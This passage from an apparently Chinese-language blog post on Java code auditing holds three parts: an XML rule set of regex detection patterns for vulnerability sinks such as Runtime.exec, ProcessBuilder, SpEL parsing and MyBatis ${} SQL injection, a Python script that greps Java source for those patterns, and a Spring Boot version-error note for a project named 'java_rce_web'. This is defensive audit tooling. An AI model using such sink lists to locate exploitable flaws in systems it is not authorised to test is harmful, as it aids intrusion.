class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>java\.nio\.channels\.AsynchronousFileChannel<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>BufferedReader<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>readAllBytes<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">regmatch</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">function</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">javaid</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">javaid</span> <span class="attr">vultype</span>=<span class="string">&#x27;Autobinding&#x27;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">function</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">rule</span> <span class="attr">name</span>=<span class="string">&#x27;SessionAttributes&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">regmatch</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>@SessionAttributes<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">regmatch</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">function</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">function</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">rule</span> <span class="attr">name</span>=<span class="string">&#x27;ModelAttribute&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">regmatch</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>@ModelAttribute<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">regmatch</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">function</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">javaid</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">javaid</span> <span class="attr">vultype</span>=<span class="string">&#x27;URL-Redirect&#x27;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">function</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">rule</span> <span class="attr">name</span>=<span class="string">&#x27;sendRedirect&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">regmatch</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>sendRedirect\(<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">regmatch</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">function</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">function</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">rule</span> <span class="attr">name</span>=<span class="string">&#x27;setHeader&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">regmatch</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>setHeader\(\&quot;refresh<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">regmatch</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">function</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">function</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">rule</span> <span class="attr">name</span>=<span class="string">&#x27;forward&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">regmatch</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>forward\(<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">regmatch</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">function</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">javaid</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">javaid</span> <span class="attr">vultype</span>=<span class="string">&#x27;EXEC&#x27;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">function</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">rule</span> <span class="attr">name</span>=<span class="string">&#x27;getRuntime&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">regmatch</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>getRuntime\(\)\.exec\(<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">regmatch</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">function</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">function</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">rule</span> <span class="attr">name</span>=<span class="string">&#x27;ProcessBuilder&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">regmatch</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>ProcessBuilder|ProcessBuilder\.start<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">regmatch</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">function</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">function</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">rule</span> <span class="attr">name</span>=<span class="string">&#x27;GroovyShell&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">regmatch</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>GroovyShell\.evaluate<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">regmatch</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">function</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">javaid</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">javaid</span> <span class="attr">vultype</span>=<span class="string">&#x27;SPelInjection&#x27;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">function</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">rule</span> <span class="attr">name</span>=<span class="string">&#x27;SpelExpressionParser&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">regmatch</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>SpelExpressionParser<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">regmatch</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">function</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">function</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">rule</span> <span class="attr">name</span>=<span class="string">&#x27;getValue&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">regmatch</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>getValue\(\)<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">regmatch</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">function</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">javaid</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">javaid</span> <span class="attr">vultype</span>=<span class="string">&#x27;SQLi&#x27;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">function</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">rule</span> <span class="attr">name</span>=<span class="string">&#x27;select&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">regmatch</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>(into|where)[^\$]*(\$\&#123;[^,#=\s]+\&#125;)<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">regmatch</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">function</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">javaid</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">javaid</span> <span class="attr">vultype</span>=<span class="string">&#x27;Info-disclosure&#x27;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">function</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">rule</span> <span class="attr">name</span>=<span class="string">&#x27;actuator&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">regmatch</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>spring-boot-starter-actuator<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">regmatch</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">function</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">javaid</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="搜索关键字的一个脚步"><a href="#搜索关键字的一个脚步" class="headerlink" title="搜索关键字的一个脚步"></a>搜索关键字的一个脚步</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> optparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># logging.basicConfig(filename=&#x27;example.log&#x27;, encoding=&#x27;utf-8&#x27;, level=logging.DEBUG)</span></span><br><span class="line"><span class="comment"># logging.basicConfig(level=logging.DEBUG)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">javaid</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,<span class="built_in">dir</span>,keysfile</span>):</span></span><br><span class="line">        self._keysfile = keysfile   <span class="comment"># 关键字文件地址</span></span><br><span class="line">        self._line = <span class="number">0</span>              <span class="comment"># 代码行数</span></span><br><span class="line">        self._<span class="built_in">dir</span> = <span class="built_in">dir</span>             <span class="comment"># 项目代码地址</span></span><br><span class="line">        self._shortfilename = <span class="string">&#x27;&#x27;</span>    <span class="comment"># 文件名</span></span><br><span class="line">        self._filename = <span class="string">&#x27;&#x27;</span>         <span class="comment"># 文件路径</span></span><br><span class="line">        self._vultype = <span class="string">&#x27;&#x27;</span>          <span class="comment"># 漏洞类型</span></span><br><span class="line">        self._code = <span class="string">&#x27;&#x27;</span>             <span class="comment"># 匹配到的这行代码，文件路径</span></span><br><span class="line">        self._keys = <span class="string">&#x27;&#x27;</span>             <span class="comment"># 需要查找的关键字，前面带**re**的是以正则查询</span></span><br><span class="line">        self._rekey = <span class="string">&quot;*re*&quot;</span>        <span class="comment"># 正则识别关键字</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_run</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self._keysfile == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            self.keys = <span class="built_in">input</span>(<span class="string">&quot;关键字&gt;&gt;&gt;&gt;&gt;&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            f = <span class="built_in">open</span>(self._keysfile,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">            self.keys = f.read()</span><br><span class="line">            f.close()</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(self.keys+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        self.handlePath(self._<span class="built_in">dir</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">report_info</span>(<span class="params">self,key</span>):</span></span><br><span class="line">        <span class="comment"># 输出控制</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+]【\033[1;32m&quot;</span>+key+<span class="string">&quot;\033[0m】【\033[1;34m&quot;</span>+self._shortfilename+<span class="string">&quot;\033[0m】&quot;</span>+self._filename)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">report_code</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># 输出代码</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;line:&quot;</span>,self._line,<span class="string">&quot; code: \033[1;31m&quot;</span>,self._code,<span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handlePath</span>(<span class="params">self, path</span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        用递归遍历所有的文件名，并发给handleFile()方法去处理</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        dirs = os.listdir(path) </span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> d <span class="keyword">in</span> dirs:</span><br><span class="line">            subpath = os.path.join(path, d) </span><br><span class="line">            <span class="keyword">if</span> os.path.isfile(subpath):</span><br><span class="line">                <span class="keyword">if</span> os.path.splitext(subpath)[<span class="number">1</span>] == <span class="string">&#x27;.java&#x27;</span>:</span><br><span class="line">                <span class="comment"># if os.path.splitext(subpath)[1] == &#x27;.java&#x27; or os.path.splitext(subpath)[1] == &#x27;.xml&#x27;:</span></span><br><span class="line">                    self._filename =subpath</span><br><span class="line">                    (_, self._shortfilename) = os.path.split(subpath)</span><br><span class="line">                    self.handleFile(subpath)</span><br><span class="line">                    <span class="comment"># logging.info(subpath)</span></span><br><span class="line">                    <span class="comment"># input(&quot;&gt;&gt;&quot;)</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.handlePath(subpath) </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handleFile</span>(<span class="params">self, fileName</span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        打开文件， 发给check_regexp去使用正则处理</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="comment">#print &#x27;begin read file:&#x27; + fileName</span></span><br><span class="line">        f = <span class="built_in">open</span>(fileName, <span class="string">&#x27;r&#x27;</span>) </span><br><span class="line">        self._line = <span class="number">0</span></span><br><span class="line">        content = f.read()</span><br><span class="line">        self.check_regexp(content)</span><br><span class="line">        f.close() </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_regexp</span>(<span class="params">self, content</span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        使用正则搜索文件内容中的关键字</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> content:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> key <span class="keyword">in</span> self.keys.strip().split(<span class="string">&quot;\n&quot;</span>):</span><br><span class="line">            logging.info(key)</span><br><span class="line">            <span class="keyword">if</span> key.startswith(<span class="string">&quot;// &quot;</span>):</span><br><span class="line">                <span class="comment"># key被注释，跳过</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> key.startswith(self._rekey):</span><br><span class="line">                <span class="comment"># 判断到使用正则匹配</span></span><br><span class="line">                logging.info(self._shortfilename+<span class="string">&quot; search-re&quot;</span>)</span><br><span class="line">                key = key.removeprefix(self._rekey)</span><br><span class="line">                key_pattern = re.<span class="built_in">compile</span>(key)</span><br><span class="line">                results = key_pattern.findall(content)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(results) &gt; <span class="number">0</span>:</span><br><span class="line">                    self.report_info(key)</span><br><span class="line">                    <span class="keyword">for</span> result <span class="keyword">in</span> results:</span><br><span class="line">                        self.get_code(result)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># 直接关键字搜索</span></span><br><span class="line">                logging.info(self._shortfilename+<span class="string">&quot; search-key&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> key <span class="keyword">in</span> content:</span><br><span class="line">                    self.report_info(key)</span><br><span class="line">                    self.get_code(key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_code</span>(<span class="params">self,result</span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        匹配相关代码，并确定文件行数</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        fl = <span class="built_in">open</span>(self._filename, <span class="string">&#x27;r&#x27;</span>) </span><br><span class="line">        self._line =<span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            line = fl.readline()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> line:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            self._line += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> result <span class="keyword">in</span> line:</span><br><span class="line">                self._code = line.strip()</span><br><span class="line">                self.report_code()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = optparse.OptionParser(<span class="string">&#x27;usage: python %prog [options](eg: python %prog -d /user/java/demo)&#x27;</span>)</span><br><span class="line">    parser.add_option(<span class="string">&#x27;-d&#x27;</span>, <span class="string">&#x27;--dir&#x27;</span>, dest = <span class="string">&#x27;dir&#x27;</span>, <span class="built_in">type</span> = <span class="string">&#x27;string&#x27;</span>, <span class="built_in">help</span> = <span class="string">&#x27;source code file dir&#x27;</span>)</span><br><span class="line">    parser.add_option(<span class="string">&#x27;-k&#x27;</span>, <span class="string">&#x27;--keys&#x27;</span>, dest = <span class="string">&#x27;keys&#x27;</span>, <span class="built_in">type</span> = <span class="string">&#x27;string&#x27;</span>, <span class="built_in">help</span> = <span class="string">&#x27;keys file&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    (options, args) = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    keysfile = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> options.keys != <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            f = <span class="built_in">open</span>(options.keys,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">            key = f.readline()</span><br><span class="line">            f.close()</span><br><span class="line">            keysfile = options.keys</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;keys file read error&quot;</span>)</span><br><span class="line">            sys.exit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> options.<span class="built_in">dir</span> == <span class="literal">None</span> <span class="keyword">or</span> options.<span class="built_in">dir</span> == <span class="string">&quot;&quot;</span>:</span><br><span class="line">        parser.print_help()</span><br><span class="line">        sys.exit()</span><br><span class="line">    <span class="built_in">dir</span> =options.<span class="built_in">dir</span></span><br><span class="line">    javaidentify = javaid(<span class="built_in">dir</span>,keysfile)</span><br><span class="line">    javaidentify._run()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>







<h1 id="报错信息记录"><a href="#报错信息记录" class="headerlink" title="报错信息记录"></a>报错信息记录</h1><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p>Servlet.service() for servlet [dispatcherServlet] in context with path [] threw exception [Request processing failed: java.lang.IllegalStateException: No primary or single unique constructor found for interface javax.servlet.http.HttpServletResponse] with root cause</p>
<p>这个报错的重点在于后面的 java.lang.IllegalStateException: No primary or single unique constructor found for interface <strong>javax.servlet.http.HttpServletResponse</strong>] with root cause</p>
<p>对比了两个几乎一模一样的项目后发现，应该是因为org.springframework.boot的版本太高了，导致的javax.servlet出错。因为我报错的时候的pom.xml文件中，它的版本是3.1.2，我改成2.7.2就没问题了</p>
<p>这是没报错的pom.xml文件内容</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">	<span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--		&lt;version&gt;3.1.2&lt;/version&gt;--&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>java_rce_web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">name</span>&gt;</span>java_rce_web<span 